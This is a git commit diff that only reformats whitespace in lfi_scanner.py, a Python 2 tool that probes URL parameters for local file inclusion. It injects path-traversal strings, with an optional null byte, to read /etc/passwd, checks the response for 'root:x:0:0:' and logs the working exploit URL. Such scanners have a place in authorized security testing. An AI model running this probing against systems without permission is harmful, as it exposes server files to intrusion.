d8e5e2a2ac962d5b1f05abec410ae0904c5b6f59
Jakob Kramer <jakob.kramer@gmx.de>
2011-07-31 17:26:36 +0200

    pep-8

--- lfi_scanner.py
+++ lfi_scanner.py
@@ -47,8 +47,8 @@
 
 # Power to the cows!
 
-import getopt,  sys,  random,  urllib,  urllib2,  httplib,  re,  string,  os
-from urllib2 import Request,  urlopen,  URLError,  HTTPError
+import getopt, sys, random, urllib, urllib2, httplib, re, string, os
+from urllib2 import Request, urlopen, URLError, HTTPError
 from urlparse import urlparse
 from time import gmtime, strftime
  
@@ -126,16 +126,16 @@ def test_url(scan_url):
     print "[i] Trying to establish a connection with a random user agent..."
     
     user_agents = [
-                            "Mozilla/5.0 (X11; U; Linux i686; it-IT; rv:1.9.0.2) Gecko/2008092313 Ubuntu/9.25 (jaunty) Firefox/3.8", 
-                            "Mozilla/5.0 (X11; Linux i686; rv:2.0b3pre) Gecko/20100731 Firefox/4.0b3pre", 
-                            "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.1.6)", 
-                            "Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en)", 
-                            "Mozilla/3.01 (Macintosh; PPC)", 
-                            "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.9)",   
-                            "Mozilla/5.0 (X11; U; Linux 2.4.2-2 i586; en-US; m18) Gecko/20010131 Netscape6/6.01",  
-                            "Opera/8.00 (Windows NT 5.1; U; en)",  
-                            "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/0.2.153.1 Safari/525.19"
-                          ]
+        "Mozilla/5.0 (X11; U; Linux i686; it-IT; rv:1.9.0.2) Gecko/2008092313 Ubuntu/9.25 (jaunty) Firefox/3.8",
+        "Mozilla/5.0 (X11; Linux i686; rv:2.0b3pre) Gecko/20100731 Firefox/4.0b3pre",
+        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.1.6)",
+        "Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en)",
+        "Mozilla/3.01 (Macintosh; PPC)",
+        "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.9)",
+        "Mozilla/5.0 (X11; U; Linux 2.4.2-2 i586; en-US; m18) Gecko/20010131 Netscape6/6.01",
+        "Opera/8.00 (Windows NT 5.1; U; en)",
+        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/0.2.153.1 Safari/525.19"
+    ]
     user_agent = random.choice (user_agents)
     check=""
     
@@ -144,16 +144,16 @@ def test_url(scan_url):
     
     try:
         check = urllib2.urlopen(request_website)
-    except HTTPError,  e:
+    except HTTPError, e:
         print "[!] The connection could not be established."
-        print "[!] Error code: ",  e
+        print "[!] Error code: ", e
         print "[!] Exiting now!"
         print ""
         print ""
         sys.exit(1)
     except URLError, e:
         print "[!] The connection could not be established."
-        print "[!] Reason: ",  e
+        print "[!] Reason: ", e
         print "[!] Exiting now!"
         print ""
         print ""
@@ -164,7 +164,7 @@ def test_url(scan_url):
     return 
     
     
-def scan_lfi(scan_url):    
+def scan_lfi(scan_url):
     # Define all variables of this function
     parameters = {}
     original_value_of_tested_parameter = ""
@@ -191,23 +191,23 @@ def scan_lfi(scan_url):
     find_nasty_string = "root:x:0:0:"
     find_nasty_string_2 = "mail:x:8:"
     user_agents = [
-                            "Mozilla/5.0 (X11; U; Linux i686; it-IT; rv:1.9.0.2) Gecko/2008092313 Ubuntu/9.25 (jaunty) Firefox/3.8", 
-                            "Mozilla/5.0 (X11; Linux i686; rv:2.0b3pre) Gecko/20100731 Firefox/4.0b3pre", 
-                            "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.1.6)", 
-                            "Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en)", 
-                            "Mozilla/3.01 (Macintosh; PPC)", 
-                            "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.9)",   
-                            "Mozilla/5.0 (X11; U; Linux 2.4.2-2 i586; en-US; m18) Gecko/20010131 Netscape6/6.01",  
-                            "Opera/8.00 (Windows NT 5.1; U; en)",  
-                            "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/0.2.153.1 Safari/525.19"
-                          ]
-    user_agent = random.choice (user_agents)
-    lfi_response=""
+        "Mozilla/5.0 (X11; U; Linux i686; it-IT; rv:1.9.0.2) Gecko/2008092313 Ubuntu/9.25 (jaunty) Firefox/3.8", 
+        "Mozilla/5.0 (X11; Linux i686; rv:2.0b3pre) Gecko/20100731 Firefox/4.0b3pre", 
+        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.1.6)", 
+        "Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en)", 
+        "Mozilla/3.01 (Macintosh; PPC)", 
+        "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.9)",   
+        "Mozilla/5.0 (X11; U; Linux 2.4.2-2 i586; en-US; m18) Gecko/20010131 Netscape6/6.01",  
+        "Opera/8.00 (Windows NT 5.1; U; en)",  
+        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/0.2.153.1 Safari/525.19"
+    ]
+    user_agent = random.choice(user_agents)
+    lfi_response = ""
     lfi_response_source_code = ""
     replace_string = ""
     replace_string_2 = ""
     replace_me = ""
-    exploit_depth= 0
+    exploit_depth = 0
     folder_name = ""
     cd_into = ""
     log_file_name = ""
@@ -222,11 +222,11 @@ def scan_lfi(scan_url):
     if len(get_parsed_url.path) == 0:
         print "[!] The URL doesn't contain a script (e.g. target/index.php)."
     else:
-        print "[i] Script:",  get_parsed_url.path
+        print "[i] Script:", get_parsed_url.path
     if len(get_parsed_url.query) == 0:
         print "[!] The URL doesn't contain a query string (e.g. index.php?var1=x&controller=main)."
     else:
-        print "[i] URL query string:",  get_parsed_url.query
+        print "[i] URL query string:", get_parsed_url.query
         print ""
 
     # Finding all URL parameters
@@ -262,11 +262,11 @@ def scan_lfi(scan_url):
     
     # Print the parameters and store them in single variables
     print "[i] The following", parameters_count, "parameter(s) was/were found:"
-    print "[i]",  parameters
+    print "[i]", parameters
     
     # Have a look at each parameter and do some nasty stuff 
     for index, item in enumerate(parameters):
-        print "[i] Probing parameter \"",  item, "\"..."
+        print "[i] Probing parameter \"", item, "\"..."
         
         check_value_of_tested_parameter = local_file_for_first_test 
         check_value_of_tested_parameter_with_nullbyte = local_file_for_first_test + nullbyte
@@ -289,16 +289,16 @@ def scan_lfi(scan_url):
             # work. Therefore we replace "etc/passwd" with "/etc/passwd" for our first vulnerability check.
             if depth== 0:
                 replace_string = local_file_for_first_test 
-                replace_string_2 = item + param_equals  + local_file_for_first_test
-                
+                replace_string_2 = item + param_equals + local_file_for_first_test
+
             replace_me = item + param_equals + original_value_of_tested_parameter
-            modified_query_string = query_string.replace(replace_me,  replace_string_2)
+            modified_query_string = query_string.replace(replace_me, replace_string_2)
             
             # Now craft the URL
             lfi_url_part_one = "".join(get_parsed_url[0:1]) + "://"
             lfi_url_part_two = "".join(get_parsed_url[1:2]) 
-            lfi_url_part_three = "".join(get_parsed_url[2:3])  + "?"
-            lfi_url_part_four = "".join(modified_query_string)  
+            lfi_url_part_three = "".join(get_parsed_url[2:3]) + "?"
+            lfi_url_part_four = "".join(modified_query_string) 
             lfi_url = lfi_url_part_one + lfi_url_part_two + lfi_url_part_three + lfi_url_part_four
             
             # Ok, everything is prepared to enter subspace.. eeh, to call the URL (Stargate fans get this joke!)
@@ -307,50 +307,50 @@ def scan_lfi(scan_url):
     
             try:
                 lfi_response = urllib2.urlopen(request_website)
-            except URLError,  e:
+            except URLError, e:
                 print "[!] The connection could not be established."
-                print "[!] Reason: ",  e
+                print "[!] Reason: ", e
             else:
                 lfi_response_source_code = lfi_response.read()
                 if find_nasty_string in lfi_response_source_code:
                     print "[+] Found signs of a LFI vulnerability! No nullbyte was required."
                     print "[+] URL: " + lfi_url
-                    lfi_exploit_url  = lfi_url
+                    lfi_exploit_url = lfi_url
                     nullbyte_required = 0
-                    lfi_found  = 1
+                    lfi_found = 1
                     exploit_depth = depth
                     break
                 else:
                     if find_nasty_string_2 in lfi_response_source_code:
                         print "[+] Found signs of a LFI vulnerability! No nullbyte was required." 
                         print "[+] URL: " + lfi_url
-                        lfi_exploit_url  = lfi_url
+                        lfi_exploit_url = lfi_url
                         nullbyte_required = 0
-                        lfi_found  = 1
+                        lfi_found = 1
                         exploit_depth = depth
                         break
-        
+
         if nullbyte_required == 1:
             # Now with the nullbyte
             for depth in range(i, max_depth):
                 # Replace the default value of the vulnerable parameter with our LFI string
                 replace_string = (depth * one_step_deeper) + local_file + nullbyte
                 replace_string_2 = item + param_equals + (depth * one_step_deeper) + local_file + nullbyte
-            
+
                 # The first test is a special case. With the code above, we would check for the file "etc/passwd" which does not
                 # work. Therefore we replace "etc/passwd" with "/etc/passwd" for our first vulnerability check.
                 if depth== 0:
                     replace_string = check_value_of_tested_parameter_with_nullbyte
-                    replace_string_2 = item + param_equals  + check_value_of_tested_parameter_with_nullbyte
+                    replace_string_2 = item + param_equals + check_value_of_tested_parameter_with_nullbyte
                 
                 replace_me = item + param_equals + original_value_of_tested_parameter
-                modified_query_string = query_string.replace(replace_me,  replace_string_2)
-            
+                modified_query_string = query_string.replace(replace_me, replace_string_2)
+
                 # Now craft the URL
                 lfi_url_part_one = "".join(get_parsed_url[0:1]) + "://"
                 lfi_url_part_two = "".join(get_parsed_url[1:2]) 
-                lfi_url_part_three = "".join(get_parsed_url[2:3])  + "?"
-                lfi_url_part_four = "".join(modified_query_string)  
+                lfi_url_part_three = "".join(get_parsed_url[2:3]) + "?"
+                lfi_url_part_four = "".join(modified_query_string)
                 lfi_url = lfi_url_part_one + lfi_url_part_two + lfi_url_part_three + lfi_url_part_four
             
                 # Ok, everything is prepared to enter subspace.. eeh, to call the URL (Stargate fans get this joke!)
@@ -359,24 +359,24 @@ def scan_lfi(scan_url):
                 
                 try:
                     lfi_response = urllib2.urlopen(request_website)
-                except URLError,  e:
+                except URLError, e:
                     print "[!] The connection could not be established."
-                    print "[!] Reason: ",  e
+                    print "[!] Reason: ", e
                 else:
                     lfi_response_source_code = lfi_response.read()
                     if find_nasty_string in lfi_response_source_code:
                         print "[+] Found signs of a LFI vulnerability! Using the nullbyte was necessary."
                         print "[+] URL: " + lfi_url
-                        lfi_exploit_url  = lfi_url
-                        lfi_found  = 1
+                        lfi_exploit_url = lfi_url
+                        lfi_found = 1
                         exploit_depth = depth
                         break
                     else:
                         if find_nasty_string_2 in lfi_response_source_code:
                             print "[+] Found signs of a LFI vulnerability! Using the nullbyte was necessary."
                             print "[+] URL: " + lfi_url
-                            lfi_exploit_url  = lfi_url
-                            lfi_found  = 1
+                            lfi_exploit_url = lfi_url
+                            lfi_found = 1
                             exploit_depth = depth
                             break
         
@@ -389,7 +389,7 @@ def scan_lfi(scan_url):
 
     # Create a simple log file
     log_file_name = get_parsed_url.netloc + "_-_" + strftime("%d_%b_%Y_%H:%M:%S_+0000", gmtime()) + "_-_scan.log"
-    FILE = open(log_file_name,  "w")
+    FILE = open(log_file_name, "w")
     FILE.write("Simple Local File Inclusion Vulnerability Scanner - Log File\n")
     FILE.write("----------------------------------------------------------------------\n\n")
     FILE.write("Scanned URL:\n")
@@ -409,20 +409,20 @@ def scan_lfi(scan_url):
     
     
 def main(argv):
-    scan_url=""
+    scan_url = ""
     
     try:
-        opts,  args = getopt.getopt(sys.argv[1:],  "",  ["help",  "url="])
-    except getopt.GetoptError   :
+        opts, args = getopt.getopt(argv, "hu:", ["help", "url="])
+    except getopt.GetoptError:
         print_usage()
         sys.exit(2)
     
-    for opt,  arg in opts:
+    for opt, arg in opts:
         if opt in ("--help"):
             print_help()
             break
             sys.exit(1)
-        elif opt in ("--url") :
+        elif opt in ("--url"):
             scan_url=arg
             
     if len(scan_url) < 1:
